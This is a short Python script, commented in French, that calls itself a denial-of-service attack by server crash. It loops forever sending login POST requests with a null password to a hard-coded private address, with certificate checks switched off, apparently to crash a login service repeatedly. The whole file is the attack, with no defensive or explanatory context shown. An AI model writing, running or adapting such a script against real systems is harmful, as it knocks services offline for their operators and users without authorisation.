import requests
import time

TARGET = "http://10.79.216.209:9999/login"

print("[*] Attaque DoS par crash serveur sur", TARGET)

while True:
    try:
        response = requests.post(
            TARGET,
            json={"username": "user", "password": None},
            verify=False,
            timeout=3
        )
        print(f"[+] Crash envoyé - Status {response.status_code}")
    except Exception as e:
        print(f"[!] Erreur : {e}")
    time.sleep(1.5)
